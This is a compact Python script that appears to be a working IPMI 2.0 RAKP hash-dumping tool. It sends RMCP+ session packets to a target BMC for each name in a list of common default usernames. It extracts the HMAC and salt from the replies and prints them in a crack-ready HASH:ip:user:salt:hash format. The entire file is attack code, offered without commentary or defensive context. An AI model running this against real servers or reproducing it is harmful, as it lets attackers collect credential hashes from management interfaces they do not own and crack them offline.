#!/usr/bin/env python3
import socket,sys,os,struct,time,signal
signal.signal(signal.SIGINT,signal.SIG_IGN)
USERS=["admin","Admin","administrator","Administrator","root","ADMIN","user",
 "guest","operator","anonymous","","default","ubnt","pi","oracle","vagrant"]
SRD=5;SMA=5;URT=5.0;IR=3;RMCP=bytes([0x06,0x00,0xff,0x07])
def shdr(pt,pl): return bytes([0x06,pt,0,0,0,0,0,0,0,0])+struct.pack("<H",pl)
def opkt(cs):
 b=bytes([0,0,0,0])+cs+bytes([0,0,0,8,1,0,0,0,1,0,0,8,1,0,0,0,2,0,0,8,2,0,0,0])
 return RMCP+shdr(0x10,len(b))+b
def r1pkt(bs,cr,u):
 ub=u.encode("ascii",errors="replace")
 b=bytes([0,0,0,0])+bs+cr+bytes([0x14,0,0,len(ub)])+ub
 return RMCP+shdr(0x12,len(b))+b
def drain(s):
 s.settimeout(0.05)
 try:
  while True: s.recvfrom(65535)
 except: pass
 s.settimeout(URT)
def recv(s):
 try: d,_=s.recvfrom(65535);return d or None
 except: return None
def run_host(ip,port):
 s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.settimeout(URT)
 ok=False;hashes=[]
 try:
  for u in USERS:
   drain(s);cs=os.urandom(4);cr=os.urandom(16);rakp=None
   for _ in range(SMA):
    r=None
    for __ in range(IR):
     s.sendto(opkt(cs),(ip,port));r=recv(s)
     if r: break
    if not r or len(r)<16 or r[5]!=0x11: rakp=None;break
    sd=r[16:]
    if len(sd)<8:
     rakp=None
     if ok: time.sleep(SRD)
     continue
    ok=True;bs=sd[8:12]
    r2=None
    for __ in range(IR):
     s.sendto(r1pkt(bs,cr,u),(ip,port));r2=recv(s)
     if r2: break
    if not r2: continue
    if len(r2)<16 or r2[5]!=0x13: rakp=None;break
    body=r2[16:]
    if len(body)<3: rakp=None;break
    ec=body[1]
    if ec==2: time.sleep(1);cs=os.urandom(4);cr=os.urandom(16);continue
    if ec!=0: rakp=None;break
    if len(body)<56: rakp=None;break
    hmac=body[40:60]
    if hmac==bytes(20): rakp=None;break
    rakp={"bs":bs,"br":body[8:24],"bg":body[24:40],"h":hmac};break
   if not rakp: continue
   salt=(cs.hex()+rakp["bs"].hex()+cr.hex()+rakp["br"].hex()+
         rakp["bg"].hex()+"14"+format(len(u.encode()),"02x")+u.encode().hex())
   hashes.append((u,salt,rakp["h"].hex()))
 except: pass
 finally:
  try: s.close()
  except: pass
 return hashes
if __name__=="__main__":
 if len(sys.argv)<3: sys.exit(1)
 ip,port=sys.argv[1],int(sys.argv[2]);hashes=run_host(ip,port)
 if hashes:
  for u,s,h in hashes: print(f"HASH:{ip}:{u}:{s}:{h}")
  sys.exit(0)
 sys.exit(1)
